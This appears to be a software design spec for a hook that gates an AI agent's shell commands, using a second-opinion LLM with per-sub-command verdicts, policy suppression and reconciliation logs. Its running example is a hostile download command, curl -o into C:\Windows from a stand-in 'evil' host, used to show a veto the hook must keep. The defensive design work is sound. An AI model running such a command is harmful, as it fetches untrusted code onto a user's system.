# LLM Second Opinion — Phase II: Attributed Verdicts + Policy Suppression

Date: 2026-08-02
Status: Approved design (pending written-spec review)
Branch: llm-second-opinion
Builds on: docs/superpowers/specs/2026-08-01-llm-second-opinion-design.md (phase I)

## 1. Background and goal

Phase I shipped the second-opinion LLM cross-check with a **binary** verdict
(`true`/`false` for the whole command block). It has a structural flaw for our
config: the `strictness_gated` tier holds many low-risk modifying commands
(`git add`, `git commit`, `mkdir`, `Set-Content`, …) that auto-allow in normal
mode — but the LLM correctly calls them *modifying*, so **every gated command
produces an `*** LLM-VETO ***` prompt** once normal mode returns. That is a
false-alarm flood that slows the user's work.

The binary verdict also lacks **attribution**: when the LLM says "modifying"
for `git add . ; curl -o C:\Windows\e.exe http://evil/x`, we cannot tell
*which* sub-command it flagged — `git add` (deliberate policy → false alarm)
or the `curl -o` (a real read_only-pattern hole → true alarm we must keep).

**Goal:** the LLM tells us *which* sub-commands it considers modifying; the
local merge suppresses vetoes that map to the `strictness_gated` tier (the
user's accepted policy) while keeping vetoes on anything else (read_only
patterns, unknowns, unlisted danger). The verdict semantics stay pure —
suppression is recorded as an *effect*, never folded into the verdict.

Also delivered (user request): **reconciliation-grade `.log` entries** — for
every LLM-checked command, the log shows what was sent to the LLM, what came
back, what local thought, and how the final decision was reached.

## 2. Locked decisions (from brainstorming Q&A)

| # | Decision |
|---|----------|
| P1 | **Approach A — attributed verdicts.** The LLM returns *indices* into a numbered sub-command list we provide; no command-text matching anywhere. Alternatives rejected: teaching the LLM the gated names (unreliable on small models, contaminates verdict semantics, widens the Set-Content hole, +500–1500 tok/call); stripping/swapping gated commands out of the prompt (LLM judges fiction; malformed stand-ins confuse small models; masks cross-command danger); skipping gated blocks entirely (misses holes in sibling commands). |
| P2 | **Numbered list = exactly the local `SubResults`** (minus the `redirection-target` pseudo-entry). Mismatch is impossible by construction; decomposition quirks degrade gracefully. The raw block is also sent (full chain context). |
| P3 | **Index `0` = "something modifying NOT in the numbered list"** (redirect target, unlisted nested command). Maps to no gated entry → can never be suppressed. |
| P4 | **Suppression matrix (stage 1):** flagged index → `strictness_gated` = suppress; → `read_only` / unknown / safe-expression / `0` = veto. Stage 1 suppresses on tier alone; a guard hook (`Test-GatedInvocationSafe`, stage-1 = always-safe) reserves the extension point for stage 2 path-guards (writable-cmdlet target checks — follow-up mini-spec). |
| P5 | **Bare `true`/`false` stays a first-class fallback.** Unattributed `true` = modifying with no indices → nothing can be suppressed → phase-I behavior. This is the graceful-degradation path for weaker models, gated by a config switch (`attributed_verdicts`). |
| P6 | **No config shipping to the LLM.** The tier knowledge already lives locally (sub-results + new `Tier` annotation). Cost stays ~30–80 extra tokens per call (the numbered list); no prompt-caching dependency. |
| P7 | **Stats purity:** `verdict` remains pure semantics (modifying = truly modifying). Suppression is logged as `effect` + `flagged`/`suppressed` fields, so veto-suppression is measurable (`veto-suppressed-policy`). |
| P8 | **Testing structure (user directive):** phase-II cases live in NEW files in the isolated `llm-review` fixture — `test-cases.p2.small.xml` (10 typical cases; **the runner's default**) and `test-cases.p2.large.xml` (~50-case matrix; opt-in via `-XmlPath`). The ~1000 existing cases are never extended for LLM tests; they are only re-run unchanged as regression proof. |
| P9 | **Test-run reconciliation logs (user directive).** The fixture runner writes a per-run log to `c:\temp\pretoolhook-llm-review-testlogs\llm-review-run-<yyyyMMdd-HHmmss>.log` — chosen over the test folder: outside the repo (no git pollution), follows the c:\temp temporary-file rule, and co-located with the fullpipe hook logs so all LLM-test logs live in one place. Every case records the case name, PASS/FAIL, the command, and the full reconciliation block via a **shared formatter** (`Format-LlmLogBlock` in `Logger.ps1`) used identically by production (`Write-LogEntry`) and the runner — the test log looks exactly like the production `.log` block, with a `(mock)` marker on the `LLM-RECV` line when the verdict was injected. The runner prints the log path in its summary. |

## 3. Output contract v2

### 3.1 User message

```text
<command_block>
{raw command, max 8000 chars}
</command_block>
<sub_commands>
1. {sub-command 1}
2. {sub-command 2}
...
</sub_commands>
```

The numbered items are the classification result's `SubResults` (same
exclusion as scope: the `redirection-target` pseudo-entry is not numbered),
in order. `Invoke-LlmReview` builds the list once and passes it to
`Get-LlmReviewVerdict` (new `-SubCommands` parameter) and to the merge, so
prompt and lookup always use the same list.

### 3.2 System prompt changes

The phase-I definitions are unchanged. The OUTPUT CONTRACT section becomes:

```text
Reply with JSON only, nothing else:
  {"modifying": []}        - every numbered sub-command is read-only
  {"modifying": [2]}       - sub-command 2 is modifying
  {"modifying": [1, 2]}    - several are modifying
Use index 0 for anything modifying that is NOT in the numbered list
(for example a redirect target or an unlisted nested command).
No reasoning. No explanation. No markdown. Emit the JSON immediately.
```

The few-shot section gains two attributed examples (a mixed block where only
one index is modifying; an all-read-only block returning `[]`). The same v2
prompt text replaces the phase-I prompt in the POC script
(`C:\git\cc\deepseek-tester\api-gateway-caller.ps1`) to keep parity.

## 4. Parser v2

`ConvertTo-LlmVerdict` gains a `-SubCommandCount` parameter (used for range
validation) and the verdict object gains `Indices` (`$null` = unattributed):

1. **JSON with a `modifying` array** (whole response): validate strictly —
   must be an array of integers, each in range `0..SubCommandCount`.
   Empty array → `read-only`. Valid → `modifying` with `Indices` set.
   Any violation → `unusable`.
2. **Bare token** `true`/`false`: `true` → `modifying` with `Indices = $null`
   (unattributed; P5). `false` → `read-only`.
3. **Last-line rescue**: the last non-empty line is the JSON or a bare token
   → same handling, `Recovered = $true`.
4. Anything else → `unusable`.

Invalid output (out-of-range index, non-integer, wrong type, mangled JSON) →
`unusable` → phase-I fail-closed → forced ask. Never a silent allow.

## 5. Tier annotation

`Resolve-Command` already knows which tier it matches at match time; it now
records it: every sub-result gains a **`Tier`** property
(`read_only` | `strictness_gated` | `modifying` | empty for
unknown-domain/unknown-command/safe-expression results). One line per match
branch in `Resolver.ps1`; `New-ResolutionResult` gains a `-Tier` parameter
(default empty). Purely additive — all existing consumers ignore the extra
property; no re-detection, no text matching.

## 6. Merge v2

In `Invoke-LlmReview`, when `verdict = modifying` and the local decision is
`allow`:

- **Indices unattributed (`$null`)** → phase-I behavior: full veto (P5).
- **Indices attributed** → for each flagged index:

| Index maps to… | Action |
|---|---|
| `strictness_gated` tier | **Suppress** (via `Test-GatedInvocationSafe` guard hook; stage-1 = always safe) |
| `read_only` tier | **Veto** — the accident scenario |
| unknown / safe-expression (empty Tier) | **Veto** — an allow the LLM disputes |
| `modifying` tier | Agree (defensive; unreachable when local=allow) |
| `0` | **Veto** — unattributed danger, never suppressible (P3) |

- **Every flag suppressed** → allow; `effect = 'veto-suppressed-policy'`;
  `llm.flagged` / `llm.suppressed` record the index arrays (P7).
- **Any veto stands** → ask; the reason names the offending sub-command(s)
  with their indices AND lists the suppressed ones:

```text
*** LLM-VETO *** second-opinion LLM says MODIFYING: 'curl -o C:\Windows\e.exe http://evil/x' [sub-command 2] - forced to ask. | suppressed as policy: 'git add .' [1] | local reason: read-only
```

Unchanged paths: `read-only` verdict (agree / disagree-kept-ask),
`down`/`unusable` (fail-closed wordings), local=ask (LLM can never
downgrade).

## 7. Reconciliation logging (user request)

The JSONL record stays the machine record (`raw` + structured `llm` fields,
now also `flagged` and `suppressed`). The human-readable `.log` becomes the
reconciliation view: when a call actually happened (`in_scope = true`), the
single `LLM:` line is replaced by a bounded multi-line block. Out-of-scope
calls keep the one-liner; disabled = nothing (unchanged).

**Veto (attributed):**
```text
[2026-08-02 10:15:30.123] IDE:Copilot Tool:[run_in_terminal] Decision:[ask] Time:[7201ms]
  Reason: *** LLM-VETO *** ... 'curl -o C:\Windows\e.exe http://evil/x' [sub-command 2] ... | suppressed as policy: 'git add .' [1]
  Command: ___ [git add . ; curl -o C:\Windows\e.exe http://evil/x] ___
  LLM-SENT      : model=deepseek-v4-flash timeout=30000ms | [1] git add . | [2] curl -o C:\Windows\e.exe http://evil/x
  LLM-RECV      : '{"modifying":[1,2]}' (4820ms, recovered=false) -> verdict=modifying indices=[1,2]
  LLM-LOCAL     : decision=allow (read-only); tiers: [1]=strictness_gated [2]=read_only
  LLM-RECONCILE : flagged=[1,2] suppressed=[1](strictness_gated) veto=[2](read_only) -> FINAL: ask
```

**Agree:**
```text
  LLM-SENT      : model=deepseek-v4-flash | [1] aws s3 ls | [2] kubectl get pods
  LLM-RECV      : '{"modifying":[]}' (2100ms) -> verdict=read-only
  LLM-RECONCILE : agree -> FINAL: allow
```

**Down / unusable:**
```text
  LLM-RECV      : ERROR 'Response status code does not indicate success: 502 (Bad Gateway).' (1960ms) -> verdict=down
  LLM-RECONCILE : fail-closed -> FINAL: ask (*** LLM-DOWN ***)
```

Bounded bloat: each printed sub-command truncated to 120 chars; the raw
response single-lined and truncated to 200 chars. The Log object built by
`Invoke-LlmReview` gains: `sent` (numbered sub-command strings), `tiers`
(parallel array), `flagged`, `suppressed`, `error` (for down), `indices`,
`mocked` (`$true` when the verdict came from `PRETOOLHOOK_LLMREVIEW_MOCK`;
the formatter appends `(mock)` to the `LLM-RECV` line).

The block is produced by a **shared formatter** — `Format-LlmLogBlock`
(exported by `Logger.ps1`, takes the final result + Log object, returns the
multi-line string). Production `Write-LogEntry` uses it, and so does the
fixture runner: per P9, `Run-Tests.ps1` writes every case's reconciliation
block (plus case name and PASS/FAIL) to a per-run timestamped file under
`c:\temp\pretoolhook-llm-review-testlogs\` and prints the path in its
summary — so a test run leaves behind exactly the same evidence a production
call would. `Write-RecordEntry` independently adds `flagged`/`suppressed` to
the JSONL `llm` object (machine record; unchanged otherwise).

## 8. Config

One new optional key in `llm_second_opinion`:

```jsonc
"attributed_verdicts": true
```

Default `true` when the key is absent (attributed mode is the default once
this ships); `false` restores the phase-I binary contract end-to-end (binary
prompt, binary parse, no suppression) — the per-model fallback if a model
can't handle indices.
Loader validates it is a boolean (same optional-block pattern). Compiled
block carries `AttributedVerdicts`.

## 9. Mock extensions

`PRETOOLHOOK_LLMREVIEW_MOCK` keeps the 4 phase-I values (bare-token path).
New values drive the attributed path through the REAL parser (raw becomes the
corresponding JSON string):

| Mock value | Injected raw |
|---|---|
| `idx:` | `{"modifying":[]}` |
| `idx:2` | `{"modifying":[2]}` |
| `idx:1,2` | `{"modifying":[1,2]}` |
| `idx:0` | `{"modifying":[0]}` |
| `idx:5` (out of range) | `{"modifying":[5]}` → parser → `unusable` |

Unknown mock values still throw (test-authoring safety).

## 10. Testing (user directive: never the ~1000-case suites)

All phase-II tests live in the isolated `test/config/llm-review/` fixture.
The fixture's Git domain gains a `strictness_gated` tier (`git add`,
`git commit`) and its PowerShell domain gains `Set-Content` as gated
(demonstrates the known path-gap knowingly, stage-1 suppression applies).
`Run-Tests.ps1` gains `-XmlPath` (default: `test-cases.p2.small.xml`); the
pre-flight checks (bad-level config + parser units, incl. the new JSON-layer
cases with `-SubCommandCount` validation) always run regardless of the case
file. Per P9 the runner also writes a per-run reconciliation log
(`c:\temp\pretoolhook-llm-review-testlogs\llm-review-run-<yyyyMMdd-HHmmss>.log`)
via the shared `Format-LlmLogBlock`, and prints its path in the summary.
The ~1000 existing cases are never extended; they are re-run unchanged
as regression proof only.

**`test-cases.p2.small.xml` — 10 typical cases (DEFAULT):**

1. Both gated flagged → suppressed → allow; `effect=veto-suppressed-policy`, `flagged=[1,2]`, `suppressed=[1,2]`.
2. Mixed block (`git add .` gated + `curl -o` read_only) flagged `[1,2]` → veto on 2 only → ask; reason contains `curl -o` AND `suppressed as policy`.
3. read_only sub-command flagged (`idx:2`) → veto → ask.
4. `idx:` (empty) → agree → allow.
5. Bare `true` (mock `modifying`) on a gated block → unattributed → full veto → ask (P5).
6. `idx:0` → veto → ask (P3).
7. `idx:5` with N=2 → `unusable` → forced ask (`*** LLM-UNUSABLE ***`).
8. Local=ask block (contains a modifying-tier command) + `idx:1,2` → stays ask; `effect=agree` (LLM never downgrades).
9. `attributed_verdicts=false` (per-case override) + gated block + mock `modifying` → phase-I veto → ask (switch works end-to-end).
10. Single gated command at `complex_commands` → out of scope, `not_called` → allow (scope rules unchanged).

**`test-cases.p2.large.xml` — ~50-case matrix (opt-in):**

- G1 Suppression-matrix exhaustive (flagged-tier × flag-subset combinations): ~14
- G2 Levels × gated scenarios (`all` / `complex_commands` / `complex_remote`, incl. remote+gated mixes): ~8
- G3 Fallback + malformed forms (bare tokens, `idx:0`, out-of-range, non-integer, wrong type, garbage, ramble-then-JSON last line → recovered): ~10
- G4 Effects / log-field / reason-content assertions (incl. 2 fullpipe cases that read the child hook's `.log` file and assert the `LLM-SENT` / `LLM-RECV` / `LLM-RECONCILE` lines): ~6
- G5 Scope/numbering edges (numbered list excludes `redirection-target`; redirect-heavy commands; index mapping consistency): ~4
- G6 `attributed_verdicts=false` regression pass over the phase-I matrix: ~8

**Live suite** (`http/Run-LlmLiveTests.ps1`, opt-in, real gateway) gains 2
attributed cases measuring the current model's index compliance (a
both-read-only block expecting `[]`; a mixed block expecting exactly `[2]`).
A model that cannot do indices flips the config to `attributed_verdicts=false`.

**Regression proof:** phase-I fixture file unchanged and green via
`-XmlPath test-cases.xml`; `http/` mock suite 25/25; Run-AllTests 962/962;
sandbox 938/938; codex 17/17.

## 11. Error handling

| Failure | Behavior |
|---|---|
| Invalid indices (range/type) | `unusable` → forced ask (`*** LLM-UNUSABLE ***`). |
| LLM down / timeout / HTTP error | unchanged: `down` → forced ask (`*** LLM-DOWN ***`). |
| Bare `true` on gated block | unattributed → full veto (safe; P5). |
| `attributed_verdicts=false` | phase-I binary path end-to-end. |
| Tier absent on a sub-result (empty) | treated as veto-candidate (never suppressible). |
| Logger failure after merge | non-fatal warning (existing behavior). |

## 12. Risks and boundaries

- **Miscount risk:** the model may return plausible-but-wrong indices.
  Range validation catches structural errors only. Measured via the live
  suite's attributed cases before trusting a model; fallback =
  `attributed_verdicts=false`.
- **Set-Content hole remains** in stage 1 (gated suppression is tier-only).
  Accepted and logged per-call (`suppressed` field); stage 2 adds the
  path-guard via `Test-GatedInvocationSafe`, and the engine-side fix
  (path-checking gated writes, audit recommendation) is the real cure.
- **Scope unchanged:** the LLM is only consulted at all for in-scope blocks
  (levels from phase I); suppression only affects the merge, never scope.
- **Prompt-injection posture unchanged:** the LLM can only escalate, and
  index `0` cannot be suppressed.

## 13. Out of scope (YAGNI)

- Stage-2 path-guards for writable gated cmdlets (hook reserved; follow-up mini-spec).
- Shipping config/policy text to the LLM (rejected; P6) and prompt-caching dependence.
- Engine-side audit fixes H1–H6 (separate workstream, pending user approval).
- Per-sub-command LLM calls (latency/quota blowup; batch indices instead).

## 14. Component summary

| File | Change |
|---|---|
| `src/LlmReview.ps1` | Prompt v2; `-SubCommands` param; parser layers + `-SubCommandCount`; merge v2 with suppression + guard hook; expanded Log object (incl. `mocked` flag). |
| `src/Resolver.ps1` | `Tier` annotation on sub-results (one line per match branch + `-Tier` param). |
| `src/ConfigLoader.ps1` | `attributed_verdicts` validation + compilation. |
| `src/Logger.ps1` | `Format-LlmLogBlock` shared reconciliation formatter; `Write-LogEntry` uses it; `flagged`/`suppressed` in JSONL. |
| `config.json` | `attributed_verdicts: true` added to the block. |
| `test/config/llm-review/` | `-XmlPath` runner param (default small file); per-run reconciliation log to `c:\temp\pretoolhook-llm-review-testlogs\`; gated tiers in fixture config; `test-cases.p2.small.xml` + `test-cases.p2.large.xml`; parser pre-flights for the JSON layer. |
| `test/config/llm-review/http/` | 2 attributed live cases in `test-llm-live.xml`. |
| `docs/config-json-guide.md`, `README.md`, `test/config/llm-review/README.md` | Documentation updates. |
| `C:\git\cc\deepseek-tester\api-gateway-caller.ps1` | v2 prompt parity. |
